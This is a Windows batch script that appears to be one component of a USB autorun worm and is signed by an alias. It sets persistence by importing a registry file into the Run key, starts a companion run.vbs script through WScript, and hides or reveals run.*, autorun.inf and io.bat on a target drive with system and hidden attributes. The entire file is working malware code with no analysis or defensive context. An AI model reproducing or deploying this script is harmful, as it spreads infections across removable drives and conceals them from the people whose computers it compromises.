@echo off
if exist %windir%\win32.sys goto :jump
echo ######## off
regedit /s .\run.reg
:reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v AutoRun32 /d %windir%\system32\run.vbs /f
:jump
echo ######## off
if not "%1"=="" goto metka
if exist run.vbs start WScript.exe run.vbs&exit
if exist %windir%\system32\run.vbs start WScript.exe %windir%\system32\run.vbs&exit
exit
echo ######## off
:metka
if not "%1"=="Open" goto sled1
start explorer .\
exit
echo ######## off
:sled1
if not "%1"=="Over" goto :sled2
exit
echo ######## off
:sled2
if "%1"=="-" attrib -r -a -s -h %2\run.*
echo ######## off
if "%1"=="+" attrib +r +a +s +h %2\run.*
echo ######## off
if "%1"=="-" attrib -r -a -s -h %2\autorun.inf
echo ######## off
if "%1"=="+" attrib +r +a +s +h %2\autorun.inf
echo ######## off
if "%1"=="-" attrib -r -a -s -h %2\io.bat
echo ######## off
if "%1"=="+" attrib +r +a +s +h %2\io.bat
:end
:coded by h4X0R